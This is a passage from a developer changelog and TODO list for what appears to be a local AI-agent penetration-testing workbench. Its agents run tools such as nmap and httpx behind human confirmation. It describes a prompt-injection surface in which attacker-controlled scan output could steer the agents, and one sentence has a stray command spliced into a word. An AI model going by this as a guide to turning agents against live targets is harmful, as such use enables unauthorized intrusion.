      external abort / timeout / already-aborted. See POLISH.md A4. (2026-09-20)
- [ ] Log injection / server-path disclosure - `toolManager.ts` logs `record.resolvedCommand`
      (agent-controlled argv, can contain ANSI/newlines); `InvalidToolArgumentsError` echoes
      `env.workspaceRoot` verbatim to any caller, disclosing the server filesystem layout.
- [x] RAG index persists full file text; a misconfigured `WORKSPACE_ROOT` (`.`, `..`, or `backend/`)
      would index `backend/data/projects/*` (sensitive scope/notes/evidence) and make it retrievable
      via `search_knowledge_base`. Now `walkWorkspace` always skips the app's own `backend/data`
      subtree (lexical containment in the walk, plus a full no-op if `WORKSPACE_ROOT` lands inside
      it). Dotfiles/symlinks are still skipped. See POLISH.md A5. (2026-09-20)
- [ ] Prompt injection surface: scanner/parser output and finding evidence (attacker-controlled web
      content) is fed raw into the report-writer prompt and re-enters the orchestrator transcript;
      and unauthenticated `POST/PUT /api/agents` lets a rebinding/LAN attacker rewrite
      `systemPrompt`/`execTools` of agents the human later drives. Bind this to whatever auth is
      added for the High item.
- [x] No security headers (no `X-Content-Type-Options`/`X-Frame-Options`); `CORS_ORIGIN=*` accepted
      without warning. Now `securityHeaders.ts` middleware sets nosniff / DENY / no-referrer /
      same-origin CORP / strict CSP. See POLISH.md A8. (2026-09-20)
- [ ] `maxOrchestratorTaskTimeMs` is only enforced *between* agent calls, not during a single
      generation (`orchestrator.ts:527`) - a single long model call runs past the cap. Document as
      loop-only or pass a deadline into `collectAgentReply`.
- [ ] Multi-agent plan flattens distinct terminal statuses - a step ending `max_executions_reached`/
      `max_time_reached` maps the plan to `failed` (`multiAgentOrchestrator.ts:116-118`); `plan.error`
      is the only trace. Deliberate, but worth a doc line.
- [ ] `pendingStdin` entries are never evicted for abandoned `pending_confirmation` executions
      (`toolManager.ts:339`) - a large `write_file` payload stays resident for the process lifetime.
- [x] `activeExecutionByScan` leaks a stale id if `confirmExecution` throws (`scanRunner.ts:171-175`);
      a `cancelScanRun` in that window calls `cancelExecution` on a dead id and swallows the throw.
      Put the delete in a `finally`.
- [x] `listExecToolsWithStatus` runs synchronous child processes inside request handlers
      (`toolManager.ts:101-138`, ~20 tools × up to two `spawnSync` probes incl. a 3s version timeout)
      on every `GET /api/tools`, `PATCH /api/tools/:id`, and scan preview. Now memoized with a 10s
      TTL, invalidated on register/toggle/override-load. See POLISH.md A3. (2026-09-20)
- [x] No timeout/abort on RAG reindex (`ragIndex.ts:119-161`, `routes/rag.ts:12-18`) - a hung Ollama
      leaves `POST /api/rag/reindex` hanging indefinitely, and a second reindex isn't coordinated.
      Now: in-flight guard (409) + overall 5-min budget signal (504) threaded through `embed`, plus
      an always-exclude of `backend/data` from the walk. See POLISH.md A5. (2026-09-20)
- [x] Frontend `OrchestratorTask` type omits `projectId` and `model`
      (`frontend/src/types/orchestrator.ts:18-31` vs `backend/src/services/orchestrator.ts:59-77`) -
      a strict subset, so it typechecks but future backend fields are silently invisible.
- [x] `lastPositionalArg` misattributes the target for `dig <domain> <type>` (`parsers/index.ts:24`,
      `parsers/shared.ts:16-21`) - `dig example.com A` attributes findings to `"A"`. Now a
      `firstPositionalArg` helper, used for dig/whois. See POLISH.md A7. (2026-09-20)
- [ ] Creation status codes are inconsistent (200 for projects/tools, 201 for findings/agents,
      streaming for scans/orchestrator/plans/reports) - cosmetic, but worth standardizing.
- [ ] Five near-identical NDJSON write/error loops (`streamUtils.ts` vs `routes/orchestrator.ts:32-60`,
      `plans.ts:53-81`, `tools.ts:99-130`, `scanners.ts:94-110`, `reports.ts:70-95`) with subtly
      different event types - a shared "stream terminal object" helper would remove the drift risk.
- [x] Confirmed dead/inert code: `extensions/pluginRegistry.ts` + `extensions/retrievalRegistry.ts`
      zero importers (the still-planned Plugin system); `toolRegistry.ts` empty so any agent setting
      `tools` throws `UnknownToolError`. All documented in CLAUDE.md - keeping them intentional, not
      new findings.
      **Partially resolved 2026-09-20: `pluginRegistry.ts`/`retrievalRegistry.ts` (and
      `types/plugin.ts`) were deleted in commit a65fb26**; `toolRegistry.ts` remains the intentional
      inert extension point (zero tools registered, documented).
- [x] `Markdown.tsx:22` code-block copy button is keyboard-invisible (no `focus-visible:opacity-100`)
      and `handleCopy` (`Markdown.tsx:11-15`) has no `try/catch` - `navigator.clipboard.writeText`
      can reject (permissions/insecure context), producing an unhandled rejection.
- [x] Finding drawer can show a stale cross-project finding - `FindingsView.tsx:161` falls back to
      the previous project's finding object after a project switch (only `selectedIds` is cleared,
      not `selectedFinding`); an update issued from that drawer would PATCH the old project's finding.
      Fixed: `setSelectedFinding(null)` added to the same effect that already clears `selectedIds` on
      `selectedProjectId` change. 1 new `FindingsView.test.tsx` test (new file - no prior FindingsView
      test coverage existed) reproducing the exact regression (select a finding, switch project,
      assert the drawer shows nothing rather than the stale object).
- [ ] Doc drift: DEVELOPMENT.md says "3 pre-existing `only-export-components` warnings" - `oxlint`
      now reports 5 (`FindingsTimeline.tsx` + `OrchestratorTaskView.tsx`). Everything else checked
      (test counts 328/252, feature claims, `.env.example` keys) is accurate. **Update (2026-08-17):**
      back down to 3 (`OrchestratorTaskView.tsx` only) - `FindingsTimeline.tsx`'s 2 were fixed as a
      side effect of breaking two real import cycles the graph tooling flagged
      (`FindingDetails.tsx ↔ FindingsTimeline.tsx ↔ FindingsView.tsx` and
      `FindingsTable.tsx ↔ FindingsTimeline.tsx ↔ FindingsView.tsx`, both caused by
      `FindingsTimeline.tsx` importing `SELECT_CLASS` back from `FindingsView.tsx` while itself
      exporting `STATUS_TONE`/`STATUS_VERB` to `FindingsTable.tsx`/`FindingDetails.tsx`) - the shared
      constants moved to new leaf modules `frontend/src/lib/findingStatus.ts` and
      `frontend/src/components/ui/selectClass.ts`, which also deduplicated a `FINDING_STATUSES` array
      that had been copy-pasted verbatim into both `FindingsTimeline.tsx` and `FindingDetails.tsx`.
      DEVELOPMENT.md's warning count is still stale at "3" from before this session (was accurate
      when written, now redundant with this note) - worth a one-line correction next time that file
      is touched, not urgent enough on its own.

## Next up

- [x] Wire up one real `Tool` end-to-end through Ollama's native tool-calling API, surfaced via
      `POST /api/chat`. Done: `calculator` tool + `streamChatWithTools` loop in
      `backend/src/services/ollama.ts`, verified via curl. See DEVELOPMENT.md's "Tool-calling round
      trip" section for the local-model tag-compliance gap this surfaced and the fallback parser it
      required.
- [x] Surface tool-calling in the frontend. Done: a "Calculator tool" checkbox in `PromptInput`
      (state in `App.tsx`), and `ChatMessageView` renders tool-call/tool-result messages as
      distinct bubbles. Verified live in-browser with both `qwen2.5-coder:7b` (clean single round)
      and `:0.5b` (hit the 4-round safety cap after repeatedly mis-reading the expression — good
      real-world proof the cap works).
- [x] Implement the AI Agent framework: Agent Manager (`backend/src/services/agentManager.ts`) +
      reusable Chat Service (`backend/src/services/chatService.ts`), exposed via
      `GET/POST /api/agents/*`. Full required config schema (id, name, description, model,
      systemPrompt, temperature, topP, maxTokens, icon, color, enabled), model-availability
      validation with graceful online/offline status (never throws), reload endpoint, and the 8
      default agents from the spec (Planner, Recon Agent, Web Analyzer, Code Assistant, Output
      Parser, Vulnerability Validator, Report Writer, General Assistant). Frontend: AgentList shows
      icon/description/model/status, selecting an agent locks the model dropdown and seeds
      temperature/topP/maxTokens, chat routes through `POST /api/agents/:id/chat` when an agent is
      active. See DEVELOPMENT.md's "Agent Manager & Chat Service" section for the full design and
      what was verified.
- [x] Removed the `calculator` tool and its "Calculator tool" checkbox in `PromptInput` (per user
      request, now that the Tool Execution Framework/Orchestrator supersede it as the real
      tool-use path). `toolRegistry` currently has zero tools registered — the native
      Ollama-tool-calling round trip (`resolveOllamaTools`/`streamChatWithTools`) is still there,
      just unreachable from the UI until something new is registered. See DEVELOPMENT.md's
      "Tool-calling round trip" section for the update note.
- [x] Read `Agent.tools?: string[]` when building the agent-chat request so selecting an agent
      activates its own tools automatically. Done: `chatService.ts#streamAgentChat` now falls back
      to `agent.tools` when the request doesn't specify any (`request.tools ?? agent.tools`), same
      override-layering convention as the `model`/`options` fallbacks already there — but only when
      `toolsPreamble` is absent, since that field is the Orchestrator's own tell (it speaks a
      separate plain-text tool-request convention and never uses Ollama's native `tool_calls`;
      activating both on the same request would let the model reply in whichever format it
      preferred instead of the one actually being parsed). Still functionally inert right now — no
      shipped agent config sets `tools`, and `extensions/toolRegistry.ts` has zero tools registered
      — but the plumbing is now correct and ready for whenever that changes. 4 new tests (123 total).
      Verified no regression via a live plain agent-chat call. See DEVELOPMENT.md's "Agent.tools
      activation" section.
- [x] Implement the Tool Execution Framework, Phase 1 (engine + confirmation gating, no
      orchestrator/UI yet): `services/toolExecutor.ts` (generic OS-process runner: argv-only spawn,
      AbortController-based cancel/timeout, streaming output, output truncation) +
      `services/toolManager.ts` (registry, `which`-based availability, argument validation incl.
      workspace-root path containment, pending-confirmation execution lifecycle) + all ~20 tools
      from the spec (`tools/exec/builtins.ts`) + `GET/POST /api/tools/*`. Every tool requires human
      confirmation before running and filesystem tools are confined to `env.workspaceRoot` — both
      confirmed with the user before implementation given an AI agent could otherwise autonomously
      run `nmap`/`bash`/etc. against the real machine. Verified via curl: availability detection,
      request→confirm→streamed-output round trip, workspace-escape rejection, timeout, and
      mid-stream cancellation. See DEVELOPMENT.md's "Tool Execution Framework" section — the
      Orchestrator (autonomous tool-calling loop) and both UI surfaces (Tool Registry, Execution
      Console) are explicitly deferred to follow-up work, along with project-scoped history (no
      "project" concept exists in the app at all yet).
- [x] Build the Orchestrator: `services/orchestrator.ts`, a pause/resume task state machine
      (`running → waiting_confirmation → running → ... → completed/failed/cancelled/
      max_executions_reached/max_time_reached`) since every tool requiring confirmation means the
      loop can't run start-to-finish in one request. Detects a tool request via a plain-text JSON
      convention (`buildToolsPreamble`/`parseToolRequest` — separate from Ollama's native
      `tool_calls` mechanism), executes through the existing `toolManager` confirm/reject flow
      unchanged, feeds the result back, repeats. Loop-prevention via env-configurable
      `MAX_ORCHESTRATOR_TOOL_CALLS`/`MAX_ORCHESTRATOR_TASK_TIME_MS`, counting failed/invalid tool
      requests toward the cap too so a misbehaving model can't retry forever. Exposed via
      `POST/GET /api/orchestrator/tasks*`. Verified via curl: a real task reaches
      `waiting_confirmation`, confirming + resuming feeds the tool's actual output back and the
      agent produces a final answer referencing it, cancel and the executions cap both work. See
      DEVELOPMENT.md's "Orchestrator" section.
- [x] Build the Tool Registry UI + Execution Console UI + an interactive Orchestrator — done as
      the "Workbench" nav tab (`components/OrchestratorWorkbench.tsx` + `ToolRegistry.tsx` +
      `ExecutionConsole.tsx`, `hooks/useTools.ts` + `useOrchestratorTask.ts`,
      `services/toolsApi.ts` + `orchestratorApi.ts`). Confirm/reject is now a real Approve/Reject
      UI instead of curl. Three real bugs were caught and fixed via in-browser testing (not
      caught by curl or typecheck): stale objective text on new task, a stale-`useEffect`-key bug
      that hid the confirm card after a rejected/retried tool request, and leftover live output
      leaking into the next pending confirmation. See DEVELOPMENT.md's "Workbench UI" section.
- [x] Stream the agent's own text token-by-token during an orchestrator task. Done:
      `services/orchestrator.ts`'s `collectAgentReply`/`advance`/`createTask`/`resumeTask` now take
      an optional `onChunk` callback and `AbortSignal`, threaded through from
      `routes/orchestrator.ts` — `POST /tasks` and `POST /tasks/:id/resume` now respond with
      NDJSON (`{type:"chunk"|"task"|"error"}`) instead of a single JSON body, mirroring the
      existing confirm-execution stream in `routes/tools.ts`. Frontend:
      `services/orchestratorApi.ts#streamTask` reads the stream, `useOrchestratorTask`'s new
      `streamingText` accumulates it (cleared on settle), `OrchestratorWorkbench` renders it live
      with a blinking-cursor style — including during the initial "Starting…" phase before a task
      object exists yet, which was a real gap caught via in-browser testing (the first version only
      rendered streaming text inside the `task &&` block, so the create-task step showed a static
      "Starting…" with no visible output on a long generation). Verified via curl (raw NDJSON) and
      browser: plain-answer tasks, and the tool-call → confirm → resume path, both stream live and
      settle cleanly into the transcript with no duplication.
- [x] Add a "project" concept, scoped to tool execution history and Orchestrator tasks (chat stays
      a single global `sessionStorage` thread, unchanged — deliberately out of scope, see
      DEVELOPMENT.md's "Projects" section). Done: `services/projectManager.ts` (CRUD) +
      `services/projectStore.ts` (generic per-project JSON persistence) back `GET/POST/PATCH/DELETE
      /api/projects*`; `ExecutionRecord`/`OrchestratorTask` both gained `projectId`, every
      list/request/create endpoint now requires it (400 if missing), and both
      `toolManager.ts`/`orchestrator.ts` write-through to `backend/data/projects/<id>/*.json` on
      every mutation and hydrate from disk at seollama pull nomic-embed-textrver startup — history survives a restart. Frontend:
      new `ProjectPanel` (create/select/delete, inline two-step delete instead of a native
      `confirm()`) drives `useTools`/`useOrchestratorTask` via a `projectId`; starting a task is
      gated on both an agent and a project being selected, and the panel locks while a task is
      active so switching projects mid-task can't strand the confirm UI. Verified via curl
      (isolation between two projects, 400s on missing `projectId`, a backend restart preserving
      history) and in-browser (create/select/delete, scoped Tool Registry history, a full
      tool-call-and-resume task run inside a project). `backend/data/projects/*` is gitignored
      (with `.gitkeep`) since project notes may contain sensitive target/scope info, unlike the
      shipped `backend/data/agents/*.json` configs.

## Polish / hardening

- [x] Hide embedding-only models from the chat/agent model pickers. `nomic-embed-text` was listed
      in every model dropdown and rejected by Ollama the moment it was picked
      (`"nomic-embed-text:latest" does not support chat` — it's a `nomic-bert` encoder,
      `capabilities: ["embedding"]`, no generative decoder); worse, `App.tsx`'s auto-select-first
      effect could land on it with no user action, since Ollama listed it first. `capabilities?:
      string[]` added to both `OllamaModel` types (it was absent, so nothing *could* filter on it),
      new `frontend/src/lib/modelCapabilities.ts`, and the filter applied once in `useModels.ts`
      rather than at each of the five picker call sites — so a sixth picker can't reintroduce it.
      Fails open when `capabilities` is absent (older Ollama). `useModels` also returns unfiltered
      `allModels`; backend `/api/models` still reports everything installed. 7 new frontend tests.
      See DEVELOPMENT.md's "Embedding-only models are hidden from the chat/agent model pickers".
- [x] Add automated tests — first pass, backend service-level unit tests (Vitest). Covers the
      exact gaps `DEVELOPMENT.md` had been flagging: `orchestrator.ts`'s state machine + the
      `parseToolRequest` fence/JSON-extraction logic (now exported for direct testing),
      `toolExecutor.ts`'s timeout/cancellation/truncation behavior (real subprocesses via
      `process.execPath`, no mocking), `toolManager.ts`'s validation/path-containment/confirm-
      reject-cancel lifecycle, `agentManager.ts`'s config loading + online/offline status,
      `chatService.ts`'s system-prompt/options assembly, and `projectManager.ts`/`projectStore.ts`'s
      CRUD + persistence. 81 tests across 6 files (`npm test` in `backend/`), all mocking done via a
      small shared in-memory `node:fs/promises` double (`backend/src/test-utils/fakeFs.ts`) rather
      than a new dependency or refactoring source just for testability. Sanity-checked by
      temporarily breaking two source lines and confirming the matching tests actually fail (see
      DEVELOPMENT.md's "Automated tests" section). Deliberately deferred: frontend hook tests and
      HTTP route-level (`supertest`) tests — see that same section for why.
- [x] Improve the dev-mode "backend unreachable" error message. Confirmed via curl that Vite's
      proxy actually returns an empty-bodied `502` (not literal HTML as originally guessed) when
      nothing's listening on :3001 — `res.json()` on that empty body throws, so
      `httpClient.ts#throwForErrorResponse`'s existing `status >= 500` fallback was already the
      right code path, just under-specific. It now reads "Could not reach the backend server. Is
      it running? Start it with `./start.sh` (or `cd backend && npm run dev`)." — matching the
      specificity of the existing Ollama-down message. Verified live: ran the frontend alone (no
      backend) and confirmed the new message renders in both the Model and Agents sidebar panels.
- [x] Add schema validation feedback for malformed `backend/data/agents/*.json` files. Done:
      `agentManager.ts#readAgentConfigs` now also returns a list of `{file, reason}` warnings
      (invalid JSON / missing-or-malformed fields / duplicate id) alongside the loaded agents,
      exposed via a new `getAgentConfigWarnings()` and threaded onto both `GET /api/agents` and
      `POST /api/agents/reload`'s existing response payloads (`console.warn` logging kept too, not
      replaced). Frontend: `AgentList` renders a small amber warning box above the agent list when
      any exist, naming each bad file and why. Verified live: dropped in a file with invalid JSON
      and one with a duplicate id, saw both listed with the right reasons; fixed and reloaded, the
      banner cleared. Added backend test coverage (`agentManager.test.ts`) for each warning
      reason and for stale warnings clearing on a subsequent successful reload.
- [x] Redesign the frontend into a premium "AI operating system" desktop UI (dark charcoal +
      emerald, glass panels, glow borders, animation) per an explicit design spec — visual/UX only,
      no backend or `hooks`/`services`/`types` changes. New 3-column shell (`components/layout/`:
      `AppShell`/`Sidebar`/`TopBar`/`RightPanel`/`CommandPalette`), a shared `components/ui/`
      primitive set (`GlassPanel`/`StatusPill`/`Button`/`Collapsible`/`Sheet`/`ProgressRing`), a
      frontend-only emoji→Lucide icon map (`lib/icons.ts`) so agent/tool configs stay untouched, and
      a real dark/light theme toggle (`hooks/useTheme.ts`). Every existing view (Chat, Workbench,
      Plans, Projects, Settings) was reskinned onto this system; Chat's empty state became an
      animated agent-network "Command Center" built from real agent data. Deliberately did not add
      Risk Score/Coverage/heatmap-style widgets (no backend data source) or Reports/Plugins nav
      entries (those backend systems are still unbuilt placeholders). Verified live in-browser
      against real Ollama + real tools: agent selection, chat send/receive, a full Workbench
      tool-confirmation round trip, the Plans builder, the Settings sheet, and the theme toggle. See
      DEVELOPMENT.md's "Premium UI/UX Redesign" section, including a non-obvious finding about
      framer-motion animations freezing in backgrounded browser-automation tabs (not an app bug).
- [x] Close the redesign's plan gaps (loading skeletons, animated view-switch transitions) and do a
      general rough-edges pass (keyboard focus rings, an empty-state gap in `ToolRegistry`). Notably,
      the view-transition work initially used `AnimatePresence mode="wait"`, which browser-automation
      testing showed makes navigation *appear* stuck if an exit animation never completes (it can, in
      a backgrounded tab — see DEVELOPMENT.md's redesign section) — switched to `mode="popLayout"`
      so the new view always mounts immediately regardless of animation state. See DEVELOPMENT.md's
      "Polish pass" subsection.
- [x] `start.sh` kills anything matching the dev-server process patterns before launching — revisit
      if this ever needs to coexist with other projects' dev servers on the same machine. Done:
      switched from guessing at command-line patterns to PID-file tracking. Each service now
      launches via `setsid`, making it and every descendant (including tsx watch's grandchild
      process, the exact thing that used to survive a plain kill) the leader of one process group;
      the PID is written to `.backend.pid`/`.frontend.pid` (gitignored) and the next run kills the
      whole group by PID, not by pattern. Old path-scoped `pkill -f` patterns kept as a fallback
      sweep for pre-existing stragglers. Verified live: reproduced the exact orphaned-grandchild
      state, confirmed one run's fallback sweep replaced it, then confirmed a second run's cleanup
      killed the *first* run's full tree via the PID-file path alone. See DEVELOPMENT.md's
      "start.sh: PID-tracked process cleanup" section.
- [x] The redesign's Workbench `ExecutionConsole` got Copy + Export (download output as `.txt`) but
      deliberately not Search/Bookmark across execution history (from the original design spec's
      Terminal section) — would need real state design (indexing/persisting across runs)
      disproportionate to a visual pass. Done: new `ExecutionHistoryPanel.tsx` (search across tool
      id/command/output, expandable rows reusing `ExecutionConsole`) in the Workbench Home tab,
      frontend-only — no backend change needed since `GET /api/tools/executions` already returns
      everything searched. Bookmarks are a new `hooks/useBookmarks.ts`, `localStorage`-backed (a
      personal preference, not project data). Verified live against two real tool executions
      (search narrowing correctly, bookmark toggle + persistence, bookmarked-only filter, row
      expansion). See DEVELOPMENT.md's "Execution history search + bookmarks" section.
- [x] Frontend hook/component tests. Done: Vitest + React Testing Library + `@testing-library/
      user-event` + `jsdom`, 128 tests across 18 files (`cd frontend && npm test`) — every hook
      (`useSettings`, `useTheme`, `useBookmarks`, `useModels`/`useAgents`/`useProjects`/`useTools`/
      `useRag`, `useChat`, `useSessions`, `useOrchestratorTask`, `useMultiAgentPlan`) plus six
      components with real interaction logic (`PromptInput`, `ModelSelector`, `AgentList`,
      `ProjectPanel`'s two-step delete, `ChatMessageView`'s role/tool-call rendering, `ui/
      Collapsible`). Sanity-checked by breaking `useTheme`'s toggle and `ProjectPanel`'s delete
      confirmation and confirming the matching tests actually fail. See DEVELOPMENT.md's "Frontend
      hook/component tests" section, including a Node 22+ `--localstorage-file` gotcha that broke
      every storage-hook test until worked around.
- [x] Orchestrator task continuation. User-reported: completing a Workbench task (e.g. the Recon
      Agent) left no way to keep going except starting a brand-new task with no memory of the prior
      conversation. Done: `services/orchestrator.ts#continueTask` appends a follow-up user message
      to an already-`completed` task and re-advances the same loop (same task id, same message
      history, same tool budget already spent) — can itself trigger another tool call, landing back
      in `waiting_confirmation` exactly like the original run. New `POST /api/orchestrator/tasks/
      :id/continue`; frontend gained `useOrchestratorTask#continueTask` and a small follow-up input
      in `OrchestratorTaskView` (Workbench only, not the multi-agent Planner's per-step view). 6 new
      backend tests (129 total), 4 new frontend hook tests (132 total). Verified live via curl and
      in-browser against a real Recon Agent task — the same tab kept the same task, no duplicate
      ever appeared. See DEVELOPMENT.md's "Orchestrator task continuation" section.
- [x] Fixed: cancelling a `waiting_confirmation` task left its execution stuck at
      `pending_confirmation` forever (permanent "Awaiting confirmation" pill in Tool Registry/
      Execution History for a task that no longer existed). Root cause: `cancelExecution` only
      works on an execution that's actually running; `cancelTask` called it unconditionally and
      silently swallowed the throw. Done: `cancelTask` now calls `rejectExecution` for a still-
      `pending_confirmation` execution, `cancelExecution` only for one already running. 4 new/
      rewritten backend tests (130 total). Verified live via curl (execution correctly flips to
      `rejected`) and found direct evidence of the original bug already sitting in the real
      `nexus.htb` project data from before the fix. See DEVELOPMENT.md's "Cancelling a
      waiting_confirmation task left the execution stuck forever" section.
- [x] Fixed: task sessions (Workbench) could only have one open per agent — starting a new task
      for an agent that already had a session open (even a finished one) just refocused the old
      tab and silently discarded the newly-typed objective, no error shown. Done:
      `useSessions.ts#openTaskSession` no longer dedups — every "Start Task" opens a genuinely new
      session, so e.g. the Recon Agent can run `nmap` in one tab and `ffuf` in another
      concurrently. Chat sessions unchanged (still one per agent — not what was asked). Tab/node
      labels now include the objective so same-agent task tabs stay distinguishable. 1 new
      frontend test (133 total). Verified live: two concurrent Recon Agent task tabs, cancelling
      one left the other untouched. See DEVELOPMENT.md's "Concurrent task sessions per agent"
      section.
- [x] Human-in-the-loop tool failure recovery. User-reported: when a tool fails (missing/disabled/
      invalid, or ran and errored/timed out), the agent just silently retried or gave up with zero
      chance to intervene - the user wanted to be able to make a suggestion (e.g. "that tool isn't
      installed, use X instead"). Done: new `TaskStatus`/`MultiAgentPlanStatus` value
      `waiting_guidance` - both a failed tool *request* (previously an immediate silent retry) and
      a confirmed execution that *ran* and failed/was cancelled (previously an immediate silent
      auto-continue) now pause there instead. New `services/orchestrator.ts#provideGuidance(id,
      note?)` appends an optional human note before re-advancing; multi-agent plans got the same
      status taught to `multiAgentOrchestrator.ts#continueAfterStepTask` (a real regression -
      misclassifying a paused step as a failed plan - caught by tests before shipping) plus
      `provideStepGuidance`. New routes `POST /api/orchestrator/tasks/:id/guidance` and
      `POST /api/plans/:id/guidance`. Frontend: a `GuidanceInput` card in `OrchestratorTaskView`
      (optional textarea + Continue), wired into both the Workbench and the Planner. A successful
      execution or an explicit reject still auto-continue exactly as before - zero added friction
      on the common path. 15 new backend tests (145 total), 8 new frontend hook tests (141 total).
      Verified live end-to-end (curl and in-browser): asked the Recon Agent to use `amass`
      (not installed) - it paused instead of silently retrying; a guidance note suggesting
      `subfinder` got tried next (also not installed, paused again correctly rather than looping);
      a final note asking for a plain-text answer brought the task to `Completed`. See
      DEVELOPMENT.md's "Human-in-the-loop tool failure recovery (waiting_guidance)" section.
- [x] Per-agent model override + parallel agent sessions. Every agent was previously locked to one
      hardcoded model, and only one agent could be "doing something" at a time (Chat: one global
      session; Workbench: one global active task) even though the backend already ran tasks
      independently. Done: `chatService.ts`/`orchestrator.ts` accept an optional per-request/per-task
      `model` override (agent config never mutated, offline-gate skipped when overriding); new
      `hooks/useSessions.ts` (chat and task sessions, one per agent per kind, tab-focus tracked per
      view) backs a tab strip in both Chat and Workbench (`components/layout/SessionTabs.tsx`) —
      each open session is its own mounted `ChatSessionPanel`/`TaskSessionPanel` so a background
      session keeps genuinely running/streaming while another tab is focused, with no rewrite of
      `useChat`/`useOrchestratorTask` needed. `AgentNetwork`'s map now grows a node + connector line
      per open session live. A compact per-session model `<select>` (Chat) and a model picker next
      to the New Task agent picker (Workbench) let the override actually be changed, not just
      defaulted. Verified via a `window.fetch` patch that an overridden model actually reaches the
      request, and live that two concurrent chat sessions and a background Workbench task all stay
      correctly isolated. 6 new backend tests (105 total). See DEVELOPMENT.md's "Per-agent model
      override + parallel agent sessions" section.
- [x] Fixed: switching the top-level nav (Chat/Workbench/Plans/Findings) fully unmounted whichever
      view you left - `App.tsx` conditionally rendered only the active view inside a
      `motion.div key={activeView}`, so e.g. leaving Workbench destroyed every open
      `TaskSessionPanel`'s `useOrchestratorTask` state (task/liveOutput/streamingText - plain React
      state, no persistence) and orphaned any in-flight `useChat` stream in Chat (its `setState`
      calls landed on a dead component, silently losing the rest of a streaming reply). Done:
      each view now mounts once on first visit and stays mounted forever after, toggled via a
      `hidden` CSS class instead of conditional render + remount - the same "mount once, hide via
      CSS" pattern `SessionTabs`/`TaskSessionPanel`/`ChatSessionPanel` already use for session tabs
      within a view, just applied one level up. Dropped the `AnimatePresence`/`framer-motion`
      view-switch fade in favor of correctness (matches the zero-animation tab-switch already used
      everywhere else in the app). Verified live: started a Recon Agent task, approved it to
      `waiting_confirmation`, switched Workbench → Chat → Findings → Workbench, and the exact same
      confirm card (objective, tool-call bubble, Approve/Reject) was still there byte-for-byte -
      previously this would have reset to a blank "Starting…"/New Task view. See DEVELOPMENT.md's
      "Persistent top-level views (nav-switch state loss)" section.
- [x] Findings Graph usability pass (2026-08-17). The filter bar (search/severity/type/tool/target/
      tag/confidence/agent) previously only applied to Table/Timeline mode - switching to Graph hid
      the filter bar entirely and the graph always rendered every finding, unfiltered. Done:
      `FindingsGraphView` gained an optional `visibleFindingIds` prop; `FindingsView` now shows the
      filter bar in Graph mode too and passes the filtered id set through - non-matching finding
      nodes (and their edges) dim in place rather than the graph ignoring filters silently, with a
      live "N matching filters" badge next to a new node/edge count. Also added: hover/keyboard-focus
      highlighting (a node and its direct neighbors light up, everything else dims - makes tracing
      relationships in a dense graph actually usable, previously mouse-drag-only with no way to trace
      connections at all); full keyboard accessibility on finding nodes (`tabIndex`, `role="button"`,
      `aria-label`, Enter/Space to select - previously nothing in the graph was keyboard-reachable);
      and a real light-theme bug fix (edges were hardcoded to a dark-only white color, now
      `var(--color-border-strong)`, theme-aware). 4 new `FindingsGraphView.test.tsx` tests. Verified
      live in-browser against a real 49-node/92-edge project graph: filter dimming, hover highlight,
      and keyboard selection (via accessibility-tree lookup + Enter) all confirmed working.
- [x] Tool selection hints (2026-08-18). User-reported: agents reliably used a tool once told which
      one, but didn't reliably pick the right one on their own from a bare objective. The
      autonomous decide-and-call loop already existed (Task 2 below) - the gap was that the ~20
      real `ExecTool` descriptions in the tools preamble were one-liners with no "use this when..."
      cue or `arguments` example, unlike the pseudo-tools which already had worked examples. Done:
      new optional `ExecTool.usageHint` field, populated for all 20 builtins
      (`tools/exec/builtins.ts`) with a short "when to use" clause + a minimal `arguments` example,
      appended after the description in `orchestrator.ts#buildToolsPreamble` only when present -
      kept separate from `description` so the Tool Registry UI stays exactly as concise as before.
      A real side-finding surfaced while writing this pass (fixed separately, see below): the
      orchestrator's plain-text tool-request convention has no `stdin` field at all, so an
      agent-driven `write_file` call could never supply real content - always created an empty file.
      1 new backend test, 375 total, typecheck/oxlint clean. Verified live with real local models:
      Web Analyzer (system prompt names zero tools) given "Check what web server and technology
      stack https://scanme.nmap.org is running" (no tool named) correctly requested
      `{"tool": "httpx", "arguments": ["-u", "https://scanme.nmap.org"]}`, matching httpx's hint
      example exactly. See DEVELOPMENT.md's "Tool selection hints" section.
- [x] Agent-driven write_file couldn't actually write content (2026-08-18). The side-finding above,
      fixed for real - and turned out worse than first assessed: checking every reachable caller
      showed this wasn't orchestrator-specific at all, the frontend's `requestToolExecution` (the
      only client function that can attach `stdin`) has zero callers anywhere - there's no "manual
      new tool request" UI, only confirm/reject/cancel on executions something else already created.
      So `write_file` (`tee`) was 100% non-functional for real content through any path in the app.
      Done: `write_file`'s own `usageHint` now tells the model to reply with `arguments: [path,
      content]` (exactly two elements); new `orchestrator.ts#splitWriteFileContent`, called right
      before `requestExecution` in `advance()`, translates that into the real shape
      (`arguments: [path], stdin: content`) - every other tool is untouched, this is a no-op unless
      `toolRequest.tool === "write_file"`. Kept the existing deliberate design that stdin content
      never lands in the persisted/listable `ExecutionRecord` (large/sensitive content shouldn't
      linger in history) - but that meant the confirming human would approve a real write with zero
      visibility into what's being written, cutting against this app's "human stays the approval
      authority" principle. Rejected a `bash`+heredoc reimplementation (would reintroduce
      shell-quoting hazards into the one tool immune to them by construction). Shipped instead: a
      generic byte-count annotation on `resolvedCommand` whenever `body.stdin` is set - `tee
      agent-output.txt (stdin: 55 bytes)` - enough to sanity-check without the content itself ever
      persisting. 6 new backend tests (`orchestrator.test.ts` +3, `toolManager.test.ts` +3 incl. a
      real UTF-8-vs-JS-string-length case). 381 total, typecheck/oxlint clean. Verified live
      end-to-end with a real local model: General Assistant given "Save the text '...' to a file
      named agent-output.txt" correctly requested the two-element `write_file` call; the pending
      execution's persisted `arguments` were confirmed to be just `["agent-output.txt"]` (content
      never touched the record) while `resolvedCommand` showed `(stdin: 55 bytes)`; confirming it
      wrote the real file with the exact content, byte for byte - the precise thing that silently
      didn't work at all before. See DEVELOPMENT.md's "Fixed: agent-driven write_file couldn't
      actually write content" section.

## Later (once a real tool is wired up)

- [x] RAG (`types/rag.ts`, `extensions/retrievalRegistry.ts`). Done: `services/ragIndex.ts` walks
      `env.workspaceRoot`, chunks files (50 lines, 5-line overlap), embeds via a dedicated Ollama
      embedding model (`EMBEDDING_MODEL`, default `nomic-embed-text` — chat/coder models lack
      Ollama's `embedding` capability and are flatly rejected, confirmed live), and persists to
      `backend/data/rag/index.json`. New `GET/POST /api/rag/status|reindex`. Agents reach it via a
      new `search_knowledge_base` pseudo-tool in the Orchestrator's existing plain-JSON tool
